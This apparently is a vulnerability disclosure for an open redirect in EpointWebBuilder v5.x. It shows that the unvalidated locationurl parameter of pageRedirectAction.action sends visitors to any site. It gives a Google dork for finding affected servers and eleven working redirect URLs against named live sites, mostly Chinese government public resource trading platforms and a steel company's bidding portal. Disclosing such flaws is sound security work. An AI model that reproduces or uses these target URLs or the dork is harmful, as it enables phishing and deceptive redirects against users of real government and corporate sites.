# EpointWebBuilder_v5.x_VULN


## Step
Tests revealed the following links in the site:
http://xxx.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://xxx.cn&infoid=4a1ba0e4-95b3-4e58-9b8c-7530247b82a4  
The locationurl specifies the location where the visitor will be redirected, and the infoid parameter is directly related to the path of the redirected resource.  
However, the infoid and locationurl parameters have no validation beyond this.  
Therefore, make the following link: 
http://xxx.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://google.com/%23&infoid=4a1ba0e4-95b3-4e58-9b8c-7530247b82a4 , 
where the infoid parameter is directly related to the path of the redirected resource, which must be an existing UUID.   
The system will redirect the visitor to any location according to the locationurl parameter, which is google.com in the above example.
302=>
https://www.google.com/#/jyxx/001006/001006001/20230825/4a1ba0e4-95b3-4e58-9b8c-7530247b82a4.html
## Example
google query: 
`inurl:“pageRedirectAction”`

1.	江苏省公共资源交易平台（EpointWebBuilder V5.1.0-sp1）
http://ggzy.taizhou.gov.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=4a1ba0e4-95b3-4e58-9b8c-7530247b82a4
2.	龙岩公共资源交易中心
https://ggzy.longyan.gov.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=451f2a3e-2f0c-4271-bb30-38fe6a840441
3.	鞍钢智慧招投标平台
http://bid.ansteel.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=b46c9bfc-f2b4-4ea0-aac3-41d94aedf5bf
4.	喀什地区公共资源交易网
http://36.189.231.22/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=32c96e01-46e9-46e3-b8ae-859a4ce0971a
5.	和田公共资源交易网（EpointWebBuilder V5.4.1）
http://36.107.230.199:8081/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=18366a85-4578-4157-9a8f-7620e8467413
6.	莆田市人民政务
http://ggzyjy.xzfwzx.putian.gov.cn:8808/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=1ac797e4-25b7-4c08-8b69-a8113b1e6de0
7.	博州公共资源交易网（EpointWebBuilder V5.2.1-sp1）
http://xzfw.xjboz.gov.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=279f97b6-3d3f-465a-806c-8904c26ad84c
8.	枣庄市公共资源交易网（EpointWebBuilder V5.4.1）
http://ggzy.zaozhuang.gov.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=e37ce09f-420d-42b7-9079-302dc9b34aad
9.	芜湖市公共资源交易中心（EpointWebBuilder V5.4.2）
http://whsggzy.wuhu.gov.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=38e7ee57-5a22-4c89-ba59-082f42991f01
10.	博州公共资源交易网（EpointWebBuilder V5.2.1-sp1）
http://xzfw.xjboz.gov.cn/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=5bd400a1-08fd-4230-a8c0-11e9ff084cd9
11. 克州公共资源交易网
http://kzggzyjy.com.cn:8024/EpointWebBuilder/pageRedirectAction.action?cmd=pageRedirect&locationurl=http://baidu.com/%23&infoid=39f1209f-a5ee-454a-8434-9ea8d7e12db3
